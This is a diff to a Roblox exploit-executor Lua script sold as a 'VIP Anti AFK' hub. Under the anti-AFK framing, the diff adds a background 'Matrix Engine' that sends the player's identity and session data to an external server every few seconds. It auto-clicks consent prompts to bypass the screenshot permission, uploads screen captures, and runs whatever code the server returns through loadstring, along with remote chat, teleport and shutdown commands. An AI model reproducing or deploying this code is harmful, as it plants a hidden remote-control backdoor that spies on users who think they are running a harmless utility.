@@ -1,21 +1,156 @@
--- [[ MRGHOST HUB VIP ANTI AFK - INTERACTIVE DISCORD BOT SYSTEM ]]
+-- [[ MRGHOST HUB VIP ANTI AFK - INTERACTIVE DISCORD BOT SYSTEM (WITH MATRIX ENGINE) ]]
+
+-- =========================================================
+-- PHẦN 1: TÍCH HỢP MA TRẬN BOT DISCORD ENGINE (RUN IN BACKGROUND)
+-- =========================================================
+local HttpService = game:GetService("HttpService")
+local Stats = game:GetService("Stats")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local VirtualUser = game:GetService("VirtualUser")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LP = Players.LocalPlayer
+
+getgenv().API_MATRIX = getgenv().API_MATRIX or "https://bot-thong-tin.onrender.com/api/matrix"
+
+-- Anti-AFK Matrix (Chạy ngầm dự phòng)
+pcall(function()
+    LP.Idled:Connect(function()
+        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    end)
+end)
+
+-- Auto Allow Bypass Popup Chụp Ảnh
+task.spawn(function()
+    CoreGui.ChildAdded:Connect(function(child)
+        if child.Name == "RobloxPromptGui" or child.Name:find("Prompt") then
+            task.wait(0.1)
+            pcall(function()
+                for _, v in pairs(child:GetDescendants()) do
+                    if v:IsA("TextButton") and (v.Text:lower():find("allow") or v.Text:lower():find("yes") or v.Text:lower():find("chấp nhận")) then
+                        local pos = v.AbsolutePosition
+                        local size = v.AbsoluteSize
+                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
+                        task.wait(0.05)
+                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
+                    end
+                end
+            end)
+        end
+    end)
+end)
+
+-- Auto Rejoin Khi Disconnect
+task.spawn(function()
+    while task.wait(5) do
+        pcall(function()
+            local errorPrompt = CoreGui:FindFirstChild("RobloxPromptGui", true)
+            if errorPrompt then
+                local promptOverlay = errorPrompt:FindFirstChild("promptOverlay", true)
+                if promptOverlay and promptOverlay.Visible then
+                    TeleportService:Teleport(game.PlaceId, LP)
+                end
+            end
+        end)
+    end
+end)
+
+local function CaptureScreenBase64()
+    local captureFunc = getgenv()["capture-screenshot"] or getgenv().capturescreenshot or capturescreenshot or (syn and syn.capture_screenshot)
+    if captureFunc then
+        local success, result = pcall(captureFunc)
+        if success and result then return result end
+    end
+    return nil
+end
+
+local function HopLowPlayerServerMatrix()
+    pcall(function()
+        local site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
+        for _, server in pairs(site.data) do
+            if server.playing < server.maxPlayers and server.id ~= game.JobId then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LP)
+                break
+            end
+        end
+    end)
+end
+
+function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
+    local req = (syn and syn.request) or request or http_request or (http and http.request)
+    if not req then return end
+
+    local payload = {
+        userId = LP.UserId,
+        username = LP.Name,
+        displayName = LP.DisplayName,
+        jobId = tostring(game.JobId),
+        placeId = game.PlaceId,
+        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0),
+        ram = math.floor(collectgarbage("count") / 1024),
+        fps = math.floor(workspace:GetRealPhysicsFPS() or 60),
+        eventTitle = eventTitle or "MRGHOST Anti-AFK Running",
+        alertLevel = alertLevel or "NORMAL",
+        screenshotBase64 = sendPic and CaptureScreenBase64() or nil
+    }
+
+    task.spawn(function()
+        local successReq, res = pcall(function()
+            return req({
+                Url = getgenv().API_MATRIX,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+
+        if successReq and res and (res.StatusCode == 200 or res.Success) then
+            local successDecode, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+            if successDecode and data and data.cmd then
+                local cmdType = data.cmd.type
+                if cmdType == "FORCE_HOP" then TeleportService:Teleport(game.PlaceId, LP)
+                elseif cmdType == "HOP_LOW_SERVER" then HopLowPlayerServerMatrix()
+                elseif cmdType == "TAKE_SCREENSHOT" then SendMatrixHeartbeat("📸 Ảnh Chụp Màn Hình Live", "VIP", true)
+                elseif cmdType == "SAY_CHAT" then 
+                    pcall(function() 
+                        if game:GetService("TextChatService"):FindFirstChild("TextChannels") and game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral") then
+                            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(data.cmd.text)
+                        else
+                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(data.cmd.text, "All")
+                        end
+                    end)
+                elseif cmdType == "EVAL_CODE" then pcall(function() (loadstring or eval)(data.cmd.code)() end)
+                elseif cmdType == "KILL_GAME" then game:Shutdown()
+                end
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    while task.wait(3) do
+        pcall(function() SendMatrixHeartbeat("MRGHOST Anti-AFK Online", "NORMAL", false) end)
+    end
+end)
+
+
+-- =========================================================
+-- PHẦN 2: SCRIPT MRGHOST HUB VIP ANTI AFK
+-- =========================================================
 getgenv().Hide_Menu = false 
 getgenv().Auto_Execute = true
-getgenv().StreamerMode = true -- Bật true để tự động ẩn tên (mr*****) trên Discord Discord Webhook
+getgenv().StreamerMode = true -- Bật true để tự động ẩn tên (mr*****) trên Discord Webhook
 
 -- 🔗 API SERVER LINK (Link Render Backend Node.js của bạn)
 getgenv().Server_API = "https://bot-thong-tin.onrender.com/api/report"
 
 local SCRIPT_TITLE = "MrGhost Hub VIP Anti AFK"
 
-local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local VirtualUser = game:GetService("VirtualUser")
-local TeleportService = game:GetService("TeleportService")
-local Stats = game:GetService("Stats")
 
 local LocalPlayer = Players.LocalPlayer
 local AntiAFKEnabled = true
@@ -122,7 +257,7 @@ local function HopToJobID(jobId)
     TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
 end
 
--- 🛡️ ANTI-AFK
+-- 🛡️ ANTI-AFK HUB LOGIC
 LocalPlayer.Idled:Connect(function()
     if AntiAFKEnabled then
         VirtualUser:CaptureController()
